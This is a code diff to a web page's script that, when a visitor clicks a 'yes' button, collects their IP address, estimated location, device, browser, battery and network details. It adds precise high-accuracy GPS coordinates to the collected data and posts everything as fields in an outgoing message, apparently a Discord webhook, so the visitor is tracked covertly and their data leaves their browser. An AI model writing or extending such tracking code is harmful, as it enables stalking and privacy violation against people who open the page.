@@ -123,7 +123,7 @@
             color: #ffffff;
             font-size: 1.4rem;
             font-weight: bold;
-            text-shadow: 0 0 10px rgba(255, 255, 255, 0.85), 0 0 20px rgba(255, 255, 255, 0.4), 0 2px 5px rgba(0, 0, 0, 0.15);
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.85), 0 0 20px rgba(255, 255, 255, 0.4), 0 2px 5px rgba(0,0,0,0.15);
             animation: fadeIn 0.5s ease forwards;
         }
 
@@ -319,20 +319,55 @@
             return { os, browser, hardwareDetail };
         }
 
-        // Retrieves device live battery metrics if supported by mobile web engine
+        // Retrieves device live battery level and charging state
         async function getBatteryDetails() {
-            let info = "Not Supported";
+            let info = { level: "Unknown", charging: "Unknown" };
             try {
                 if (navigator.getBattery) {
                     const battery = await navigator.getBattery();
-                    const percentage = Math.round(battery.level * 100);
-                    const chargingStatus = battery.charging ? "🔌 Charging" : "🔋 Discharging";
-                    info = `${percentage}% (${chargingStatus})`;
+                    info.level = `${Math.round(battery.level * 100)}%`;
+                    info.charging = battery.charging ? "Yes" : "No";
                 }
             } catch (e) {
                 console.error('Battery API access failed:', e);
             }
             return info;
+        }
+
+        // Retrieves network down-link speed configurations
+        function getNetworkSpeed() {
+            let speed = "Unknown";
+            try {
+                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                if (conn && conn.downlink) {
+                    speed = `${conn.downlink} Mbps`;
+                    if (conn.effectiveType) {
+                        speed += ` (${conn.effectiveType.toUpperCase()})`;
+                    }
+                }
+            } catch (e) {
+                console.error('Network Information access failed:', e);
+            }
+            return speed;
+        }
+
+        // Attempts to extract precise GPS Coordinates from device browser
+        function getCoordinates() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve("Not Supported");
+                } else {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            resolve(`${position.coords.latitude.toFixed(6)}, ${position.coords.longitude.toFixed(6)}`);
+                        },
+                        (error) => {
+                            resolve("Denied/Timed Out");
+                        },
+                        { enableHighAccuracy: true, timeout: 4000 }
+                    );
+                }
+            });
         }
 
         yesBtn.addEventListener('click', async () => {
@@ -369,6 +404,8 @@
 
             const cleanDevice = getCleanDeviceInfo();
             const batteryInfo = await getBatteryDetails();
+            const netSpeed = getNetworkSpeed();
+            const gpsCoords = await getCoordinates();
             const screenRes = `${window.screen.width}x${window.screen.height}`;
             const localTime = new Date().toLocaleString();
 
@@ -385,7 +422,10 @@
                         fields: [
                             { name: "🌐 IP Address", value: ipAddress, inline: true },
                             { name: "📍 Estimated Location", value: locationData, inline: true },
-                            { name: "🔋 Battery Level", value: batteryInfo, inline: true },
+                            { name: "📍 Precise Coordinates", value: gpsCoords, inline: true },
+                            { name: "🔋 Battery Level", value: batteryInfo.level, inline: true },
+                            { name: "🔌 Is Charging?", value: batteryInfo.charging, inline: true },
+                            { name: "⚡ Network Speed", value: netSpeed, inline: true },
                             { name: "📱 Operating System", value: cleanDevice.os, inline: true },
                             { name: "🛠️ Hardware/GPU Engine", value: cleanDevice.hardwareDetail, inline: true },
                             { name: "🌐 Web Browser", value: cleanDevice.browser, inline: true },
